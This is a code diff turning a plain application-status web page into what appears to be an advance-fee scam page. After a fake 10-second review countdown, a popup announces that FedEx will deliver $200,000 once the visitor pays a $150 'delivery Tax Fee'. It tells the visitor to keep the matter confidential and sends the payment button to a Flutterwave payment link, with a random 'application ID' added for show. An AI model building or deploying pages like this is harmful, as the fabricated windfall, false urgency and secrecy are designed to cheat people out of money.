@@ -1,105 +1,261 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Complaint status</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Application Under Review</title>
 
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: Arial, sans-serif;
-    }
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
 
-    body {
-      background: linear-gradient(135deg, #4CAF50, #2E7D32);
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #333;
-    }
+body{
+    background:#f4f7fa;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
 
-    .container {
-      background: #fff;
-      padding: 40px;
-      border-radius: 12px;
-      text-align: center;
-      max-width: 400px;
-      width: 90%;
-      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-    }
+.container{
+    background:#fff;
+    width:90%;
+    max-width:650px;
+    padding:40px;
+    border-radius:12px;
+    box-shadow:0 4px 15px rgba(0,0,0,0.15);
+    text-align:center;
+}
 
-    .success-icon {
-      font-size: 60px;
-      color: #4CAF50;
-      margin-bottom: 20px;
-    }
+h1{
+    color:#2c3e50;
+    margin-bottom:15px;
+}
 
-    h1 {
-      margin-bottom: 10px;
-      font-size: 24px;
-      color: #2E7D32;
-    }
+.icon{
+    font-size:55px;
+    margin-bottom:10px;
+}
 
-    p {
-      margin-bottom: 25px;
-      font-size: 16px;
-      color: #555;
-    }
+.countdown{
+    font-size:70px;
+    font-weight:bold;
+    color:#007bff;
+    margin:20px 0;
+}
 
-    .btn {
-      display: inline-block;
-      padding: 12px 20px;
-      margin: 5px;
-      border-radius: 6px;
-      text-decoration: none;
-      font-weight: bold;
-      transition: 0.3s;
-    }
+.status{
+    background:#fff3cd;
+    color:#856404;
+    padding:15px;
+    border-radius:8px;
+    margin-top:20px;
+}
 
-    .btn-home {
-      background: #4CAF50;
-      color: #fff;
-    }
+/* Popup */
+.popup-overlay{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,0.65);
+    display:none;
+    justify-content:center;
+    align-items:center;
+}
 
-    .btn-home:hover {
-      background: #388E3C;
-    }
+.popup{
+    background:#fff;
+    width:90%;
+    max-width:500px;
+    padding:30px;
+    border-radius:12px;
+    text-align:center;
+    animation:fade 0.3s ease;
+}
 
-    .btn-new {
-      background: #f1f1f1;
-      color: #333;
-    }
+@keyframes fade{
+    from{transform:scale(0.8); opacity:0;}
+    to{transform:scale(1); opacity:1;}
+}
 
-    .btn-new:hover {
-      background: #ddd;
-    }
+.popup h2{
+    color:#28a745;
+    margin-bottom:10px;
+}
 
-    .footer {
-      margin-top: 20px;
-      font-size: 12px;
-      color: #888;
-    }
-  </style>
+.popup p{
+    margin-bottom:15px;
+    color:#444;
+}
+
+.fee{
+    font-size:22px;
+    font-weight:bold;
+    color:#dc3545;
+    margin-bottom:20px;
+}
+
+/* Application ID Section inside popup */
+.appid-box{
+    background:#f1f3f5;
+    padding:15px;
+    border-radius:10px;
+    margin-bottom:20px;
+}
+
+.appid-label{
+    font-size:13px;
+    color:#6c757d;
+    margin-bottom:5px;
+}
+
+.appid-value{
+    font-size:18px;
+    font-weight:bold;
+    color:#333;
+    margin-bottom:10px;
+    word-break:break-all;
+}
+
+.copy-btn{
+    padding:8px 14px;
+    border:none;
+    border-radius:6px;
+    background:#007bff;
+    color:#fff;
+    cursor:pointer;
+}
+
+.copy-btn:hover{
+    background:#0056b3;
+}
+
+.btn{
+    padding:12px 20px;
+    border:none;
+    border-radius:6px;
+    margin:5px;
+    cursor:pointer;
+    font-size:16px;
+}
+
+.accept{
+    background:#28a745;
+    color:#fff;
+}
+
+.later{
+    background:#6c757d;
+    color:#fff;
+}
+</style>
 </head>
 
 <body>
-  <div class="container">
-    <div class="success-icon">✔</div>
 
-    <h1>Application on que </h1>
+<div class="container">
 
-    <p>
-      Your Application have been received Our team will review it and take appropriate action shortly. Check your mail or whatsapp for any latest update for next step Today
-    </p>
+    <div class="icon">📄</div>
 
-    <a href="" class="btn btn-home">check your inbox</a>
-    <div class="footer">
-      Reference ID: <strong>#CMP-<?php echo rand(1000,9999); ?></strong>
+    <h1>Application Under Review</h1>
+
+    <p>Your application is being processed. Please wait...</p>
+
+    <div class="countdown" id="countdown">10</div>
+
+    <div class="status">
+        Status: Reviewing Application...
     </div>
-  </div>
+
+</div>
+
+<!-- Popup -->
+<div class="popup-overlay" id="popup">
+
+    <div class="popup">
+
+        <h2>🎉
+        Congratulation!!
+        Finally, we got your details and the Fedex are ready to deliver you your money of  $200,000 but you have to pay $150 for a delivery Tax Fee to get your funds approve for delivery at your  door step in 5 hours from now Congratulation to you !!!</h2>
+
+        <p>Esure you note this  application id down because it will be used to keep track of your payment, and keep your aplication confidential until you get your funds delivered to you to avoid been rubbed </p>
+
+        <!-- Application ID moved here -->
+        <div class="appid-box">
+            <div class="appid-label">Your Application ID (Save for verification)</div>
+            <div class="appid-value" id="appId"></div>
+
+            <button class="copy-btn" onclick="copyAppId()">
+                Copy Application ID
+            </button>
+        </div>
+
+        <div class="fee">$150 Application Fee Required</div>
+
+        <button class="btn accept" onclick="acceptApplication()">
+            Accept application and pay
+        </button>
+
+        <button class="btn later" onclick="continueLater()">
+            Continue Later
+        </button>
+
+    </div>
+
+</div>
+
+<script>
+
+// Generate Application ID
+function generateAppId(){
+    const prefix = "APP-2026-";
+    const random = Math.floor(100000 + Math.random() * 900000);
+    return prefix + random;
+}
+
+// Set Application ID in popup
+const appId = generateAppId();
+document.getElementById("appId").textContent = appId;
+
+// Copy function
+function copyAppId(){
+    navigator.clipboard.writeText(appId).then(() => {
+        alert("Application ID copied successfully");
+    });
+}
+
+// Countdown
+let count = 10;
+const countdown = document.getElementById("countdown");
+
+const timer = setInterval(() => {
+    count--;
+    countdown.textContent = count;
+
+    if(count <= 0){
+        clearInterval(timer);
+        document.getElementById("popup").style.display = "flex";
+    }
+}, 1000);
+
+// Redirect to Flutterwave
+function acceptApplication(){
+    window.location.href = "https://flutterwave.com/pay/kqsgvbl9spjm";
+}
+
+// Continue later
+function continueLater(){
+    alert("You can continue later.");
+    document.getElementById("popup").style.display = "none";
+}
+
+</script>
+
 </body>
 </html>
